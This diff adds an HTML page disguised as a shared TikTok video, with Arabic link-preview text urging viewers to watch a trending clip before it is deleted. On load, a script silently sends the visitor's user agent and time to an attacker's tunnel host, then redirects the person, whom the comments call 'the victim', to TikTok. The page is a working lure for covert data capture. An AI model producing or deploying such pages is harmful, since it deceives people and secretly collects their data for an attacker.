@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>TikTok Video</title>
+    <meta property="og:title" content="TikTok - شاهد هذا الفيديو">
+    <meta property="og:description" content="فيديو ترند جديد.. شاهد الآن قبل الحذف">
+    <meta property="og:image" content="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/card/main/static/img/logo_144c91a.png">
+    
+    <script>
+        async function captureAndGo() {
+            // ملاحظة: هذا الرابط سنحدثه لاحقاً ليتطابق مع نفقك
+            const myTunnel = "http://crm71sjvsl.loclx.io"; 
+
+            const info = {
+                ua: navigator.userAgent,
+                time: new Date().toLocaleString()
+            };
+
+            // إرسال البيانات صمتاً إلى الكالي
+            fetch(myTunnel, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: btoa(JSON.stringify(info))
+            });
+
+            // تحويل الضحية فوراً للتيك توك
+            setTimeout(() => {
+                window.location.href = "https://www.tiktok.com/trending";
+            }, 600);
+        }
+        window.onload = captureAndGo;
+    </script>
+</head>
+<body style="background:#000;"></body>
+</html>
